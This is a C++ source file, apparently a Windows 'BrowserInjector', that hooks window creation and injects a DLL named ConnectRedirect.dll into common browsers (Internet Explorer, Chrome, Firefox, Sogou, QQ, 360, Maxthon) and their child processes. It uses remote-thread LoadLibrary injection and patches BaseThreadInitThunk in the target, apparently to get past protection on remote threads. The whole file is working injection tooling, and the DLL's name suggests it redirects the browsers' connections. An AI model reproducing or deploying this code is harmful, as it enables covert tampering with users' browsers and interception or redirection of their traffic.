// BrowserInjector.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "ShellHook.h"
#include <map>

#include "FileInfoQuery.h"

CString g_strThisDllPath;

BOOL InjectDll_RemoteThread(DWORD ProcessID,LPCWSTR szDllPath );

BOOL GetProcessName(DWORD processID,WCHAR *pszProcessName,DWORD dwBufferLen )
{
	HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	if (hProcess == FALSE)
	{
		return FALSE;
	}

	typedef BOOL (WINAPI *TypeQueryFullProcessImageName)(
		HANDLE hProcess,
		DWORD dwFlags,
		LPTSTR lpExeName,
		PDWORD lpdwSize
		);
	static TypeQueryFullProcessImageName pQueryFullProcessImageName = (TypeQueryFullProcessImageName)GetProcAddress(GetModuleHandleW(L"kernel32.dll"),"QueryFullProcessImageNameW");
	if (pQueryFullProcessImageName)
	{
		pQueryFullProcessImageName(hProcess,0,pszProcessName,&dwBufferLen);
	}
	else
	{
		DWORD dwRes =  GetModuleFileNameExW(hProcess, NULL, pszProcessName, dwBufferLen);
	}

	CloseHandle(hProcess);

	return TRUE;
}

BOOL CheckBrowserWndClassName( LPCWSTR pszClassName )
{
	BOOL bWbClass = FALSE;
	CString strClassName;
	strClassName = pszClassName;

	if (

		strClassName.CompareNoCase(L"IEFrame") == 0 || 
		strClassName.CompareNoCase(L"SE_SogouExplorerFrame") == 0 || 
		strClassName.CompareNoCase(L"360se6_Frame") == 0 || 
		strClassName.CompareNoCase(L"Chrome_RenderWidgetHostHWND") == 0 || 
		strClassName.CompareNoCase(L"QQBrowserMainFrame") == 0 || 
		strClassName.CompareNoCase(L"QQBrowser_WidgetWin_0") == 0 || 
		strClassName.CompareNoCase(L"Chrome_WidgetWin_100") == 0 || 
		strClassName.CompareNoCase(L"BRMainFrameGUI") == 0 || 
		strClassName.CompareNoCase(L"Chrome_WidgetWin_1") == 0 || 
		strClassName.CompareNoCase(L"QQBrowser_WidgetWin_1") == 0 ||
		strClassName.CompareNoCase(L"MozillaWindowClass") == 0 ||
		strClassName.CompareNoCase(L"Maxthon3Cls_MainFrm") == 0

		)
	{

		bWbClass = TRUE;
	}

	return bWbClass;
}


DWORD WINAPI InjectSubProcess(PVOID pParam)
{
	DWORD dwParentPid = (DWORD)pParam;
	BOOL bFound = FALSE;
	for (int i=0;i<50;i++)
	{
		HANDLE   m_handle=::CreateToolhelp32Snapshot(TH32CS_SNAPALL,0);  
		PROCESSENTRY32 Info;  
		Info.dwSize = sizeof(PROCESSENTRY32); 
		if(::Process32First(m_handle,&Info))  
		{ 
			DWORD tick=GetTickCount();
			while(::Process32Next(m_handle,&Info)!=FALSE)  
			{
				if (Info.th32ParentProcessID == dwParentPid)
				{
					InjectDll_RemoteThread(Info.th32ProcessID,g_strThisDllPath);

					bFound = TRUE;
				}
			}

			::CloseHandle(m_handle);
			memset(&Info,0,sizeof(PROCESSENTRY32));
		}

		if (bFound)
		{
			break;
		}

		Sleep(100);
	}
	return 0;
}


BOOL CheckProcessRunning( DWORD dwPid )
{
	int retValue = 0;
	HANDLE hProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION ,FALSE,dwPid);
	if (hProcessHandle != NULL)
	{
		DWORD dwExitCode = 0;
		BOOL bRes = GetExitCodeProcess(hProcessHandle,&dwExitCode);
		if (bRes)
		{
			if(dwExitCode==STILL_ACTIVE)
			{
				retValue=1;
			}	
		}

		CloseHandle(hProcessHandle);
	}
	return retValue;
}

DWORD WINAPI KeepingInjectSubProcess(PVOID pParam)
{
	//防止重复注入
	std::map<DWORD,char> mapInjected;

	DWORD dwParentPid = (DWORD)pParam;
	DWORD dwTick = GetTickCount();
	while( TRUE )
	{
		//检查父进程是否退出
		if ( GetTickCount() - dwTick > 10000 )
		{
			dwTick = GetTickCount();
			if( FALSE == CheckProcessRunning(dwParentPid) )
			{
				break;
			}
		}

		HANDLE   m_handle=::CreateToolhelp32Snapshot(TH32CS_SNAPALL,0);  
		PROCESSENTRY32 Info;  
		Info.dwSize = sizeof(PROCESSENTRY32); 
		if(::Process32First(m_handle,&Info))  
		{
			while(::Process32Next(m_handle,&Info)!=FALSE)  
			{
				if ( Info.th32ParentProcessID == dwParentPid)
				{
					if ( mapInjected.find( Info.th32ProcessID ) == mapInjected.end() )
					{
						mapInjected[Info.th32ProcessID]=1;
						InjectDll_RemoteThread(Info.th32ProcessID,g_strThisDllPath);
					}

				}
			}

			::CloseHandle(m_handle);
			memset(&Info,0,sizeof(PROCESSENTRY32));
		}

		Sleep(50);
	}
	return 0;
}


VOID GetFileInfoByHWND( HWND hWnd , CString &strProductName,CString &strFileDescription )
{

	DWORD dwProcessId = 0;
	DWORD dwThreadId = GetWindowThreadProcessId(hWnd,&dwProcessId);

	CString strExeFullPath;
	GetProcessName(dwProcessId,strExeFullPath.GetBuffer(MAX_PATH),MAX_PATH);
	strExeFullPath.ReleaseBuffer();

	strProductName = GetFileProductName(strExeFullPath);
	strFileDescription = GetFileDescription(strExeFullPath);
}


BOOL InjectDll_RemoteThread(DWORD ProcessID,LPCWSTR szDllPath )
{
#if !(defined(WIN64) || defined(_WIN64))
	typedef int (__fastcall *TypeBaseThreadInitThunk)(int a1, DWORD_PTR pThreadStartAddr, PVOID  pParam, int a4, int a5);

	HANDLE hProcessHandle = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,FALSE,ProcessID);

	if (hProcessHandle)
	{
// 		//如果运行在64系统则单独判断一下
// 		if (g_bX64System)
// 		{
// 			BOOL bWow64Proc = FALSE;
// 			IsWow64Process(hProcessHandle,&bWow64Proc);
// 
// 			//说明是64位进程，则启动注入器注入
// 			if( FALSE == bWow64Proc )
// 			{
// 				STARTUPINFO si;
// 				PROCESS_INFORMATION pi;
// 
// 				ZeroMemory(&si,sizeof(si));
// 				ZeroMemory(&pi,sizeof(pi));
// 				si.cb = sizeof(si);
// 				CString strCmdLine;
// 				strCmdLine.Format(L" -pid %d -dll %s",ProcessID,CEnDecryption::GetEncryptStr(szDllPath64));
// 
// 				BOOL bRes = CreateProcess(g_strDllInjector64,strCmdLine.GetBuffer(),NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
// 
// 				CloseHandle(pi.hProcess);
// 				CloseHandle(pi.hThread);
// 
// 				return bRes;
// 			}
// 		}

		LPVOID pRemoteBase=VirtualAllocEx(hProcessHandle,NULL,2048,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

		if(!pRemoteBase)
		{
			return FALSE;
		}
		int nDataLen = (wcslen(szDllPath)+1)*sizeof(WCHAR);
		if (!WriteProcessMemory(hProcessHandle,pRemoteBase,(LPTSTR)szDllPath,nDataLen,NULL))
		{
			VirtualFreeEx(hProcessHandle,pRemoteBase,0x1000,MEM_DECOMMIT);
			return FALSE;
		}

		LPTHREAD_START_ROUTINE pfn=(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(TEXT("Kernel32.dll")),"LoadLibraryW");

		TypeBaseThreadInitThunk pBaseThreadInitThunk = (TypeBaseThreadInitThunk)GetProcAddress(LoadLibrary(L"kernel32.dll"),"BaseThreadInitThunk");
		if(pBaseThreadInitThunk)
		{
			DWORD dwWriteLen = 0;
			WriteProcessMemory(hProcessHandle,pBaseThreadInitThunk,pBaseThreadInitThunk,10,&dwWriteLen);
		}

		HANDLE hRemoteThread = CreateRemoteThread(hProcessHandle,NULL,0,pfn,pRemoteBase,0,NULL);
		if (hRemoteThread==NULL)
		{
			DWORD dwErrorCode = GetLastError();
			VirtualFreeEx(hProcessHandle,pRemoteBase,0x1000,MEM_DECOMMIT);
			return FALSE;
		}

		CloseHandle(hRemoteThread);
		CloseHandle(hProcessHandle);

		return TRUE;
	}
#endif
	return FALSE;
}

VOID CALLBACK MyShellHookCallBack(HWND hWnd,WPARAM wParam,LPARAM lParam)
{
	if ( HSHELL_WINDOWCREATED == wParam)
	{
		HWND hWnd = (HWND)lParam;

		WCHAR szClassName[MAX_PATH];
		GetClassNameW(hWnd,szClassName,MAX_PATH);

#if defined(DEBUG) || defined(_DEBUG)
		OutputDebugStringW(szClassName);
		OutputDebugStringW(L"\r\n");
#endif
		BOOL bCheckBrowser = FALSE;

		bCheckBrowser = CheckBrowserWndClassName( szClassName );
 		if( FALSE == bCheckBrowser )
 		{
 			CString strProductName;
 			CString strFileDescription;
 
 			GetFileInfoByHWND(hWnd,strProductName,strFileDescription);
 			strProductName.MakeLower();
 			strFileDescription.MakeLower();
 
 			bCheckBrowser = 
 				strProductName.Find(L"internet explorer") >= 0
 				|| strFileDescription.Find(L"internet explorer") >= 0
 				|| strProductName.Find(L"ie9") >= 0
 				|| strFileDescription.Find(L"ie9") >= 0;
 		}


		if ( bCheckBrowser )
		{			
			DWORD dwProcessId = 0;
			DWORD dwThreadId = GetWindowThreadProcessId(hWnd,&dwProcessId);

 			//搜狗浏览器需要单独处理一下
 			if (CString(szClassName).CompareNoCase(L"SE_SogouExplorerFrame") == 0)
 			{
 				CreateThread(NULL,0,InjectSubProcess,(LPVOID)dwProcessId,0,NULL);
 
 				return ;
 			}
 
 			//如果是IE也需要单独处理一下，IE发包进程是子进程
 			if (CString(szClassName).CompareNoCase(L"IEFrame") == 0)
 			{
 				CreateThread(NULL,0,KeepingInjectSubProcess,(LPVOID)dwProcessId,0,NULL);
 			}

#if defined(DEBUG) || defined(_DEBUG)
			OutputDebugStringW(L"插入\r\n");
#endif

			InjectDll_RemoteThread(dwProcessId,g_strThisDllPath);

		}

	}
}


int _tmain(int argc, _TCHAR* argv[])
{
	//获取当前模块路径
	WCHAR szLocalPath[MAX_PATH]={0};
	GetModuleFileNameW( NULL ,szLocalPath,MAX_PATH);
	WCHAR *pPathEnd = (WCHAR *)szLocalPath+wcslen(szLocalPath);
	while (pPathEnd != szLocalPath && *pPathEnd != L'\\') pPathEnd--;
	*(pPathEnd+1) = 0;

	g_strThisDllPath = szLocalPath;
	g_strThisDllPath+=L"ConnectRedirect.dll";

	StartShellHook(HSHELL_WINDOWCREATED,MyShellHookCallBack);

	getchar();

	return 0;
}

